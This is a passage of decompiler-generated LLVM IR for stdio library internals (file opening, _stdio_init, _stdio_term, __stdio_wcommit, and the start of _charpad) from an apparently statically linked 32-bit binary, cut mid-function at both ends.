  store i32 %v2_804df39, i32* @ebx, align 4
  br label %dec_label_pc_804df5e

dec_label_pc_804df3d:                             ; preds = %dec_label_pc_804def0
  %v1_804df3d = add i32 %arg4, 1
  %v8_804df3d = icmp eq i32 %v1_804df3d, 0
  store i32 %v1_804df3d, i32* @edi, align 4
  %v0_804df49.pre = load i32, i32* @ebx, align 4
  br i1 %v8_804df3d, label %dec_label_pc_804df43, label %dec_label_pc_804df40

dec_label_pc_804df40:                             ; preds = %dec_label_pc_804df3d
  %v11_804df40 = or i32 %v0_804df49.pre, 32768
  store i32 %v11_804df40, i32* @ebx, align 4
  br label %dec_label_pc_804df43

dec_label_pc_804df43:                             ; preds = %dec_label_pc_804df3d, %dec_label_pc_804df40
  %v0_804df49 = phi i32 [ %v11_804df40, %dec_label_pc_804df40 ], [ %v0_804df49.pre, %dec_label_pc_804df3d ]
  %v0_804df4a = load i32, i32* @esi, align 4
  store i32 %v0_804df4a, i32* %stack_var_-76, align 4
  %v3_804df4b = inttoptr i32 %v0_804df4a to i8*
  %v4_804df4b = call i32 @__libc_open(i8* %v3_804df4b, i32 %v0_804df49)
  store i32 %v4_804df4b, i32* %eax.global-to-local, align 4
  %v1_804df53 = load i32, i32* @ebp, align 4
  %v2_804df53 = add i32 %v1_804df53, 4
  %v3_804df53 = inttoptr i32 %v2_804df53 to i32*
  store i32 %v4_804df4b, i32* %v3_804df53, align 4
  %v2_804df56 = icmp slt i32 %v4_804df4b, 0
  br i1 %v2_804df56, label %dec_label_pc_804de85, label %dec_label_pc_804df5e

dec_label_pc_804df5e:                             ; preds = %dec_label_pc_804df43, %dec_label_pc_804df33
  %v0_804df5e = load i32, i32* @ebp, align 4
  %v1_804df5e = inttoptr i32 %v0_804df5e to i16*
  %v2_804df5e = load i16, i16* %v1_804df5e, align 2
  %v3_804df5e = and i16 %v2_804df5e, 8192
  store i16 %v3_804df5e, i16* %v1_804df5e, align 2
  %v0_804df64 = load i32, i32* @ebx, align 4
  %v8_804df66 = and i32 %v0_804df64, -31744
  %v1_804df6b = urem i32 %v0_804df64, 4
  %v1_804df6e = add nuw nsw i32 %v1_804df6b, 1
  store i32 %v1_804df6e, i32* %eax.global-to-local, align 4
  %v1_804df6f = load i32, i32* @ebp, align 4
  %v2_804df6f = inttoptr i32 %v1_804df6f to i32*
  %v3_804df6f = load i32, i32* %v2_804df6f, align 4
  %v4_804df6f = or i32 %v3_804df6f, %v8_804df66
  %v1_804df72 = mul nuw nsw i32 %v1_804df6e, 16
  %v2_804df75 = xor i32 %v1_804df72, 48
  store i32 %v2_804df75, i32* %eax.global-to-local, align 4
  %v2_804df78 = or i32 %v4_804df6f, %v2_804df75
  store i32 %v2_804df78, i32* @ebx, align 4
  %v1_804df7a = trunc i32 %v2_804df78 to i16
  %v3_804df7a = inttoptr i32 %v1_804df6f to i16*
  store i16 %v1_804df7a, i16* %v3_804df7a, align 2
  %v0_804df7e = load i32, i32* %stack_var_-76, align 4
  %v1_804df7e = call i32 @__errno_location(i32 %v0_804df7e)
  store i32 %v1_804df7e, i32* %eax.global-to-local, align 4
  store i32 %v1_804df7e, i32* @esi, align 4
  %v1_804df88 = inttoptr i32 %v1_804df7e to i32*
  %v2_804df88 = load i32, i32* %v1_804df88, align 4
  store i32 %v2_804df88, i32* @edi, align 4
  %v0_804df8a = load i32, i32* @ebp, align 4
  %v1_804df8a = add i32 %v0_804df8a, 4
  %v2_804df8a = inttoptr i32 %v1_804df8a to i32*
  %v3_804df8a = load i32, i32* %v2_804df8a, align 4
  store i32 %v3_804df8a, i32* %stack_var_-76, align 4
  %v1_804df8d = call i32 @isatty(i32 %v3_804df8a)
  %v2_804df95 = mul i32 %v1_804df8d, 256
  store i32 %v2_804df95, i32* %eax.global-to-local, align 4
  %v0_804df98 = load i32, i32* @ebx, align 4
  %v2_804df98 = or i32 %v0_804df98, %v2_804df95
  store i32 %v2_804df98, i32* @ebx, align 4
  %v1_804df9a = trunc i32 %v2_804df98 to i16
  %v2_804df9a = load i32, i32* @ebp, align 4
  %v3_804df9a = inttoptr i32 %v2_804df9a to i16*
  store i16 %v1_804df9a, i16* %v3_804df9a, align 2
  %v0_804df9e = load i32, i32* @edi, align 4
  %v1_804df9e = load i32, i32* @esi, align 4
  %v2_804df9e = inttoptr i32 %v1_804df9e to i32*
  store i32 %v0_804df9e, i32* %v2_804df9e, align 4
  %v0_804dfa0 = load i32, i32* @ebp, align 4
  %v1_804dfa0 = add i32 %v0_804dfa0, 8
  %v2_804dfa0 = inttoptr i32 %v1_804dfa0 to i32*
  %v3_804dfa0 = load i32, i32* %v2_804dfa0, align 4
  %v4_804dfa0 = icmp eq i32 %v3_804dfa0, 0
  %v1_804dfa4 = icmp eq i1 %v4_804dfa0, false
  br i1 %v1_804dfa4, label %dec_label_pc_804dfd4, label %dec_label_pc_804dfa6

dec_label_pc_804dfa6:                             ; preds = %dec_label_pc_804df5e
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_804dfae = call i32 @malloc(i32 4096)
  store i32 %v1_804dfae, i32* %eax.global-to-local, align 4
  %v1_804dfb6 = load i32, i32* @ebp, align 4
  %v2_804dfb6 = add i32 %v1_804dfb6, 8
  %v3_804dfb6 = inttoptr i32 %v2_804dfb6 to i32*
  store i32 %v1_804dfae, i32* %v3_804dfb6, align 4
  %v1_804dfb9 = icmp eq i32 %v1_804dfae, 0
  %v0_804dfcd = load i32, i32* @ebp, align 4
  br i1 %v1_804dfb9, label %dec_label_pc_804dfcd, label %dec_label_pc_804dfbd

dec_label_pc_804dfbd:                             ; preds = %dec_label_pc_804dfa6
  %v1_804dfbd = inttoptr i32 %v0_804dfcd to i16*
  %v2_804dfbd = load i16, i16* %v1_804dfbd, align 2
  %v3_804dfbd = or i16 %v2_804dfbd, 16384
  store i16 %v3_804dfbd, i16* %v1_804dfbd, align 2
  %v1_804dfc3 = add i32 %v1_804dfae, 4096
  store i32 %v1_804dfc3, i32* %eax.global-to-local, align 4
  %v1_804dfc8 = load i32, i32* @ebp, align 4
  %v2_804dfc8 = add i32 %v1_804dfc8, 12
  %v3_804dfc8 = inttoptr i32 %v2_804dfc8 to i32*
  store i32 %v1_804dfc3, i32* %v3_804dfc8, align 4
  br label %dec_label_pc_804dfd4

dec_label_pc_804dfcd:                             ; preds = %dec_label_pc_804dfa6
  %v1_804dfcd = add i32 %v0_804dfcd, 12
  %v2_804dfcd = inttoptr i32 %v1_804dfcd to i32*
  store i32 0, i32* %v2_804dfcd, align 4
  br label %dec_label_pc_804dfd4

dec_label_pc_804dfd4:                             ; preds = %dec_label_pc_804df5e, %dec_label_pc_804dfbd, %dec_label_pc_804dfcd
  %v0_804dfd4 = load i32, i32* @ebp, align 4
  %v1_804dfd4 = add i32 %v0_804dfd4, 8
  %v2_804dfd4 = inttoptr i32 %v1_804dfd4 to i32*
  %v3_804dfd4 = load i32, i32* %v2_804dfd4, align 4
  store i32 %v3_804dfd4, i32* %eax.global-to-local, align 4
  %v1_804dfd7 = add i32 %v0_804dfd4, 2
  %v2_804dfd7 = inttoptr i32 %v1_804dfd7 to i8*
  store i8 0, i8* %v2_804dfd7, align 1
  %v0_804dfdb = load i32, i32* %eax.global-to-local, align 4
  %v1_804dfdb = load i32, i32* @ebp, align 4
  %v2_804dfdb = add i32 %v1_804dfdb, 24
  %v3_804dfdb = inttoptr i32 %v2_804dfdb to i32*
  store i32 %v0_804dfdb, i32* %v3_804dfdb, align 4
  %v0_804dfde = load i32, i32* %eax.global-to-local, align 4
  %v1_804dfde = load i32, i32* @ebp, align 4
  %v2_804dfde = add i32 %v1_804dfde, 28
  %v3_804dfde = inttoptr i32 %v2_804dfde to i32*
  store i32 %v0_804dfde, i32* %v3_804dfde, align 4
  %v0_804dfe1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804dfe1 = load i32, i32* @ebp, align 4
  %v2_804dfe1 = add i32 %v1_804dfe1, 16
  %v3_804dfe1 = inttoptr i32 %v2_804dfe1 to i32*
  store i32 %v0_804dfe1, i32* %v3_804dfe1, align 4
  %v0_804dfe4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804dfe4 = load i32, i32* @ebp, align 4
  %v2_804dfe4 = add i32 %v1_804dfe4, 20
  %v3_804dfe4 = inttoptr i32 %v2_804dfe4 to i32*
  store i32 %v0_804dfe4, i32* %v3_804dfe4, align 4
  %v0_804dfe7 = load i32, i32* @ebp, align 4
  %v1_804dfe7 = add i32 %v0_804dfe7, 44
  %v2_804dfe7 = inttoptr i32 %v1_804dfe7 to i32*
  store i32 0, i32* %v2_804dfe7, align 4
  %v0_804dfee = load i32, i32* @ebp, align 4
  %v1_804dfee = add i32 %v0_804dfee, 1
  %v2_804dfee = inttoptr i32 %v1_804dfee to i8*
  %v3_804dfee = load i8, i8* %v2_804dfee, align 1
  %v4_804dfee = and i8 %v3_804dfee, 32
  %v5_804dfee = icmp eq i8 %v4_804dfee, 0
  %v0_804dff2 = load i32, i32* @global_var_8059f0c.198, align 4
  store i32 %v0_804dff2, i32* @eax, align 4
  %v2_804dff7 = add i32 %v0_804dfee, 52
  %v3_804dff7 = inttoptr i32 %v2_804dff7 to i32*
  store i32 %v0_804dff2, i32* %v3_804dff7, align 4
  br i1 %v5_804dfee, label %dec_label_pc_804e069, label %dec_label_pc_804dffc

dec_label_pc_804dffc:                             ; preds = %dec_label_pc_804dfd4
  %v2_804e007 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804e007, i32* %stack_var_-76, align 4
  %v2_804e00c = call i32 @__pthread_return_void(i32 %v2_804e007, i32 134550911)
  store i32 %v2_804e00c, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8059ef4.195 to i32), i32* %stack_var_-76, align 4
  %v1_804e018 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059ef4.195 to i32))
  store i32 %v1_804e018, i32* @eax, align 4
  %v2_804e02a = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804e02a, i32* %stack_var_-76, align 4
  %v2_804e02f = call i32 @__pthread_return_void(i32 %v2_804e02a, i32 134550911)
  store i32 %v2_804e02f, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8059edc.199 to i32), i32* %stack_var_-76, align 4
  %v1_804e03b = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059edc.199 to i32))
  %v0_804e040 = load i32, i32* bitcast (i32** @global_var_8059ed8.200 to i32*), align 8
  store i32 %v0_804e040, i32* @eax, align 4
  %v1_804e045 = load i32, i32* @ebp, align 4
  %v2_804e045 = add i32 %v1_804e045, 32
  %v3_804e045 = inttoptr i32 %v2_804e045 to i32*
  store i32 %v0_804e040, i32* %v3_804e045, align 4
  %v0_804e048 = load i32, i32* @ebp, align 4
  store i32 %v0_804e048, i32* bitcast (i32** @global_var_8059ed8.200 to i32*), align 8
  %v2_804e04e = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_804e04e, i32* @ecx, align 4
  store i32 %v2_804e02a, i32* %stack_var_-76, align 4
  %v2_804e053 = call i32 @__pthread_return_void(i32 %v2_804e02a, i32 1)
  store i32 %v2_804e02a, i32* @eax, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v2_804e007, i32* %stack_var_-76, align 4
  %v2_804e05d = call i32 @__pthread_return_void(i32 %v2_804e007, i32 1)
  store i32 %v2_804e05d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e062

dec_label_pc_804e062:                             ; preds = %dec_label_pc_804de8f, %dec_label_pc_804dffc
  br label %dec_label_pc_804e069

dec_label_pc_804e067:                             ; preds = %dec_label_pc_804de85, %dec_label_pc_804de72
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804e069

dec_label_pc_804e069:                             ; preds = %dec_label_pc_804dfd4, %dec_label_pc_804debe, %dec_label_pc_804e062, %dec_label_pc_804e067
  %v0_804e06c = load i32, i32* @ebp, align 4
  store i32 %v0_804e06c, i32* %eax.global-to-local, align 4
  %v2_804e06e = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e06e, i32* @ebx, align 4
  store i32 %v0_804de46, i32* @esi, align 4
  store i32 %v0_804de45, i32* @edi, align 4
  store i32 %v0_804de44, i32* @ebp, align 4
  ret i32 %v0_804e06c

; uselistorder directives
  uselistorder i32 %v2_804e02a, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_804e007, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804dfcd, { 1, 0 }
  uselistorder i32 %v1_804dfae, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804df95, { 1, 0 }
  uselistorder i32 %v1_804df7e, { 1, 0, 2 }
  uselistorder i32 %v11_804df40, { 1, 0 }
  uselistorder i32 %v0_804df49.pre, { 1, 0 }
  uselistorder i32 %v1_804df11, { 1, 0 }
  uselistorder i32 %v0_804df0d, { 1, 0 }
  uselistorder i32 %v1_804df02, { 1, 0, 2 }
  uselistorder i32 %v1_804dec3, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_804deb2, { 1, 0 }
  uselistorder i32 %v0_804de85, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 21, 22, 23, 24, 25, 26, 19, 27, 28, 29 }
  uselistorder i32 577, { 0, 2, 1 }
  uselistorder i32 %arg4, { 3, 2, 1, 4, 0, 5 }
  uselistorder label %dec_label_pc_804e069, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804e062, { 1, 0 }
  uselistorder label %dec_label_pc_804dfd4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804df43, { 1, 0 }
  uselistorder label %dec_label_pc_804df33, { 1, 0 }
  uselistorder label %dec_label_pc_804def0, { 1, 0 }
  uselistorder label %dec_label_pc_804deba, { 1, 0 }
  uselistorder label %dec_label_pc_804deac, { 1, 0 }
  uselistorder label %dec_label_pc_804dea1, { 2, 0, 1 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e075 = load i32, i32* @edi, align 4
  %v0_804e076 = load i32, i32* @esi, align 4
  %v0_804e077 = load i32, i32* @ebx, align 4
  store i32 %v0_804e077, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_804e080 = call i32 @__errno_location(i32 %v0_804e077)
  store i32 %v1_804e080, i32* @edi, align 4
  %v0_804e08a = load i32, i32* @global_var_8059f20.191, align 32
  store i32 %v0_804e08a, i32* @esi, align 4
  %v1_804e090 = inttoptr i32 %v1_804e080 to i32*
  %v2_804e090 = load i32, i32* %v1_804e090, align 4
  store i32 %v2_804e090, i32* %ebp.global-to-local, align 4
  %v1_804e094 = call i32 @isatty(i32 0)
  %v0_804e099 = load i32, i32* @ebx, align 4
  %v2_804e09b = sub i32 %v0_804e099, %v1_804e094
  %v2_804e0a6 = mul i32 %v2_804e09b, 256
  %v0_804e0a9 = load i32, i32* @esi, align 4
  %v2_804e0a9 = xor i32 %v0_804e0a9, %v2_804e0a6
  %v1_804e0ab = trunc i32 %v2_804e0a9 to i16
  store i16 %v1_804e0ab, i16* bitcast (i32* @global_var_8059f20.191 to i16*), align 32
  %v0_804e0b2 = load i32, i32* @global_var_8059f70.192, align 16
  store i32 %v0_804e0b2, i32* @esi, align 4
  %v1_804e0b8 = call i32 @isatty(i32 1)
  %v0_804e0bd = load i32, i32* @ebx, align 4
  %v2_804e0bd = sub i32 %v0_804e0bd, %v1_804e0b8
  %v2_804e0bf = mul i32 %v2_804e0bd, 256
  %v0_804e0c2 = load i32, i32* @esi, align 4
  %v2_804e0c2 = xor i32 %v2_804e0bf, %v0_804e0c2
  %v1_804e0c4 = trunc i32 %v2_804e0c2 to i16
  store i16 %v1_804e0c4, i16* bitcast (i32* @global_var_8059f70.192 to i16*), align 16
  %v0_804e0cb = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e0cb = load i32, i32* @edi, align 4
  %v2_804e0cb = inttoptr i32 %v1_804e0cb to i32*
  store i32 %v0_804e0cb, i32* %v2_804e0cb, align 4
  %v2_804e0d0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e0d0, i32* @ebx, align 4
  store i32 %v0_804e076, i32* @esi, align 4
  store i32 %v0_804e075, i32* @edi, align 4
  ret i32 %v1_804e0b8

; uselistorder directives
  uselistorder i32 %v1_804e080, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  %v3_804e0e3 = inttoptr i32 %arg1 to i16*
  %v4_804e0e3 = call i32 @memcpy(i16* %v3_804e0e3, i32 ptrtoint (i32* @global_var_8056da0.201 to i32), i32 24)
  ret i32 %v4_804e0e3
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e0ec = load i32, i32* @esi, align 4
  %v0_804e0ed = load i32, i32* @ebx, align 4
  store i32 %v0_804e0ed, i32* %stack_var_-8, align 4
  %v1_804e0f6 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_8059edc.199 to i32))
  store i32 %v1_804e0f6, i32* %eax.global-to-local, align 4
  %v1_804e102 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_8059ef4.195 to i32))
  store i32 %v1_804e102, i32* %eax.global-to-local, align 4
  %storemerge21 = load i32, i32* bitcast (i32** @global_var_8059ed8.200 to i32*), align 4
  store i32 %storemerge21, i32* %ebx.global-to-local, align 4
  %v1_804e14c22 = icmp eq i32 %storemerge21, 0
  %v1_804e14e23 = icmp eq i1 %v1_804e14c22, false
  br i1 %v1_804e14e23, label %dec_label_pc_804e10f.lr.ph, label %dec_label_pc_804e16c.preheader

dec_label_pc_804e10f.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804e10f

dec_label_pc_804e10f:                             ; preds = %dec_label_pc_804e10f.lr.ph, %dec_label_pc_804e136
  %storemerge24 = phi i32 [ %storemerge21, %dec_label_pc_804e10f.lr.ph ], [ %storemerge, %dec_label_pc_804e136 ]
  %v1_804e112 = add i32 %storemerge24, 56
  store i32 %v1_804e112, i32* @esi, align 4
  %v1_804e116 = call i32 @__pthread_return_0(i32 %v1_804e112)
  store i32 %v1_804e116, i32* %eax.global-to-local, align 4
  %v1_804e11e = icmp eq i32 %v1_804e116, 0
  br i1 %v1_804e11e, label %dec_label_pc_804e136, label %dec_label_pc_804e122

dec_label_pc_804e122:                             ; preds = %dec_label_pc_804e10f
  %v0_804e122 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e122 = add i32 %v0_804e122, 8
  %v2_804e122 = inttoptr i32 %v1_804e122 to i32*
  %v3_804e122 = load i32, i32* %v2_804e122, align 4
  store i32 %v3_804e122, i32* %eax.global-to-local, align 4
  %v1_804e125 = inttoptr i32 %v0_804e122 to i16*
  store i16 48, i16* %v1_804e125, align 2
  %v0_804e12a = load i32, i32* %eax.global-to-local, align 4
  %v1_804e12a = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e12a = add i32 %v1_804e12a, 24
  %v3_804e12a = inttoptr i32 %v2_804e12a to i32*
  store i32 %v0_804e12a, i32* %v3_804e12a, align 4
  %v0_804e12d = load i32, i32* %eax.global-to-local, align 4
  %v1_804e12d = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e12d = add i32 %v1_804e12d, 28
  %v3_804e12d = inttoptr i32 %v2_804e12d to i32*
  store i32 %v0_804e12d, i32* %v3_804e12d, align 4
  %v0_804e130 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e130 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e130 = add i32 %v1_804e130, 16
  %v3_804e130 = inttoptr i32 %v2_804e130 to i32*
  store i32 %v0_804e130, i32* %v3_804e130, align 4
  %v0_804e133 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e133 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e133 = add i32 %v1_804e133, 20
  %v3_804e133 = inttoptr i32 %v2_804e133 to i32*
  store i32 %v0_804e133, i32* %v3_804e133, align 4
  br label %dec_label_pc_804e136

dec_label_pc_804e136:                             ; preds = %dec_label_pc_804e10f, %dec_label_pc_804e122
  %v0_804e139 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e139 = add i32 %v0_804e139, 52
  %v2_804e139 = inttoptr i32 %v1_804e139 to i32*
  store i32 1, i32* %v2_804e139, align 4
  %v0_804e140 = load i32, i32* @esi, align 4
  %v1_804e141 = call i32 @__stdio_init_mutex(i32 %v0_804e140)
  store i32 %v1_804e141, i32* %eax.global-to-local, align 4
  %v0_804e146 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e146 = add i32 %v0_804e146, 32
  %v2_804e146 = inttoptr i32 %v1_804e146 to i32*
  %storemerge = load i32, i32* %v2_804e146, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_804e14c = icmp eq i32 %storemerge, 0
  %v1_804e14e = icmp eq i1 %v1_804e14c, false
  br i1 %v1_804e14e, label %dec_label_pc_804e10f, label %dec_label_pc_804e149.dec_label_pc_804e16c.preheader_crit_edge

dec_label_pc_804e149.dec_label_pc_804e16c.preheader_crit_edge: ; preds = %dec_label_pc_804e136
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_8059ed8.200 to i32*), align 4
  br label %dec_label_pc_804e16c.preheader

dec_label_pc_804e16c.preheader:                   ; preds = %dec_label_pc_804e149.dec_label_pc_804e16c.preheader_crit_edge, %entry
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_804e149.dec_label_pc_804e16c.preheader_crit_edge ], [ %storemerge21, %entry ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_804e16c3 = icmp eq i32 %storemerge12, 0
  %v1_804e16e10 = icmp eq i1 %v1_804e16c3, false
  br i1 %v1_804e16e10, label %dec_label_pc_804e158.preheader, label %dec_label_pc_804e170

dec_label_pc_804e158.preheader:                   ; preds = %dec_label_pc_804e16c.preheader
  br label %dec_label_pc_804e158

dec_label_pc_804e158:                             ; preds = %dec_label_pc_804e158.preheader, %dec_label_pc_804e169
  %v0_804e160 = phi i32 [ %storemerge1, %dec_label_pc_804e169 ], [ %storemerge12, %dec_label_pc_804e158.preheader ]
  %v1_804e158 = inttoptr i32 %v0_804e160 to i8*
  %v2_804e158 = load i8, i8* %v1_804e158, align 1
  %v3_804e158 = and i8 %v2_804e158, 64
  %v4_804e158 = icmp eq i8 %v3_804e158, 0
  br i1 %v4_804e158, label %dec_label_pc_804e169, label %dec_label_pc_804e15d

dec_label_pc_804e15d:                             ; preds = %dec_label_pc_804e158
  %v1_804e161 = call i32 @__stdio_wcommit(i32 %v0_804e160)
  store i32 %v1_804e161, i32* %eax.global-to-local, align 4
  %v0_804e169.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e169

dec_label_pc_804e169:                             ; preds = %dec_label_pc_804e158, %dec_label_pc_804e15d
  %v0_804e169 = phi i32 [ %v0_804e160, %dec_label_pc_804e158 ], [ %v0_804e169.pre, %dec_label_pc_804e15d ]
  %v1_804e169 = add i32 %v0_804e169, 32
  %v2_804e169 = inttoptr i32 %v1_804e169 to i32*
  %storemerge1 = load i32, i32* %v2_804e169, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_804e16c = icmp eq i32 %storemerge1, 0
  %v1_804e16e = icmp eq i1 %v1_804e16c, false
  br i1 %v1_804e16e, label %dec_label_pc_804e158, label %dec_label_pc_804e170

dec_label_pc_804e170:                             ; preds = %dec_label_pc_804e169, %dec_label_pc_804e16c.preheader
  %v2_804e170 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e170, i32* %eax.global-to-local, align 4
  %v2_804e171 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e171, i32* @ebx, align 4
  store i32 %v0_804e0ec, i32* @esi, align 4
  ret i32 %v2_804e170

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %ebx.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_804e169, { 1, 0 }
  uselistorder label %dec_label_pc_804e158, { 1, 0 }
  uselistorder label %dec_label_pc_804e136, { 1, 0 }
  uselistorder label %dec_label_pc_804e10f, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_804e174 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804e17c = add i32 %arg1, 8
  %v2_804e17c = inttoptr i32 %v1_804e17c to i32*
  %v3_804e17c = load i32, i32* %v2_804e17c, align 4
  store i32 %v3_804e17c, i32* %edx.global-to-local, align 4
  %v1_804e17f = add i32 %arg1, 16
  %v2_804e17f = inttoptr i32 %v1_804e17f to i32*
  %v3_804e17f = load i32, i32* %v2_804e17f, align 4
  %v2_804e182 = sub i32 %v3_804e17f, %v3_804e17c
  %v12_804e182 = icmp eq i32 %v2_804e182, 0
  store i32 %v2_804e182, i32* %eax.global-to-local, align 4
  br i1 %v12_804e182, label %dec_label_pc_804e195, label %dec_label_pc_804e186

dec_label_pc_804e186:                             ; preds = %entry
  store i32 %v3_804e17c, i32* %v2_804e17f, align 4
  %v0_804e189 = load i32, i32* @ecx, align 4
  %v0_804e18a = load i32, i32* %eax.global-to-local, align 4
  %v0_804e18b = load i32, i32* %edx.global-to-local, align 4
  %v0_804e18c = load i32, i32* @ebx, align 4
  %v4_804e18d = inttoptr i32 %v0_804e18c to i16*
  %v5_804e18d = call i32 @__stdio_WRITE(i16* %v4_804e18d, i32 %v0_804e18b, i32 %v0_804e18a, i32 %v0_804e189)
  store i32 %v5_804e18d, i32* %eax.global-to-local, align 4
  %v0_804e195.pre = load i32, i32* @ebx, align 4
  %v2_804e19b.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804e195

dec_label_pc_804e195:                             ; preds = %entry, %dec_label_pc_804e186
  %v2_804e19b = phi i32 [ %tmp11, %entry ], [ %v2_804e19b.pre, %dec_label_pc_804e186 ]
  %v0_804e195 = phi i32 [ %arg1, %entry ], [ %v0_804e195.pre, %dec_label_pc_804e186 ]
  %v1_804e195 = add i32 %v0_804e195, 16
  %v2_804e195 = inttoptr i32 %v1_804e195 to i32*
  %v3_804e195 = load i32, i32* %v2_804e195, align 4
  store i32 %v3_804e195, i32* %eax.global-to-local, align 4
  %v2_804e198 = add i32 %v0_804e195, 8
  %v3_804e198 = inttoptr i32 %v2_804e198 to i32*
  %v4_804e198 = load i32, i32* %v3_804e198, align 4
  %v5_804e198 = sub i32 %v3_804e195, %v4_804e198
  store i32 %v5_804e198, i32* %eax.global-to-local, align 4
  store i32 %v2_804e19b, i32* @edx, align 4
  store i32 %v0_804e174, i32* @ebx, align 4
  ret i32 %v5_804e198

; uselistorder directives
  uselistorder i32 %v0_804e195, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804e195, { 1, 0 }
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-13 = alloca i32, align 4
  %v0_804e1a0 = load i32, i32* @edi, align 4
  %v0_804e1a1 = load i32, i32* @esi, align 4
  %v0_804e1a2 = load i32, i32* @ebx, align 4
  %v0_804e1a3 = load i32, i32* @eax, align 4
  store i32 %v0_804e1a3, i32* @edi, align 4
  %v0_804e1a8 = load i32, i32* @ecx, align 4
  store i32 %v0_804e1a8, i32* @esi, align 4
  store i32 %v0_804e1a8, i32* @ebx, align 4
  %v0_804e1ac = load i32, i32* @edx, align 4
  store i32 %v0_804e1ac, i32* %stack_var_-13, align 4
  %v1_804e1b32 = icmp eq i32 %v0_804e1a8, 0
  br i1 %v1_804e1b32, label %dec_label_pc_804e1cb, label %dec_label_pc_804e1b7.lr.ph

dec_label_pc_804e1b7.lr.ph:                       ; preds = %entry
  %v2_804e1b7 = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_804e1b7

dec_label_pc_804e1b2:                             ; preds = %dec_label_pc_804e1b7
  %v1_804e1b2 = add i32 %v0_804e1b2, -1
  %v8_804e1b2 = icmp eq i32 %v1_804e1b2, 0
  store i32 %v1_804e1b2, i32* @ebx, align 4
  br i1 %v8_804e1b2, label %dec_label_pc_804e1cb.loopexit, label %dec_label_pc_804e1b2.dec_label_pc_804e1b7_crit_edge

dec_label_pc_804e1b2.dec_label_pc_804e1b7_crit_edge: ; preds = %dec_label_pc_804e1b2
  %v0_804e1bb.pre = load i32, i32* @edx, align 4
  %v0_804e1bc.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804e1b7

dec_label_pc_804e1b7:                             ; preds = %dec_label_pc_804e1b2.dec_label_pc_804e1b7_crit_edge, %dec_label_pc_804e1b7.lr.ph
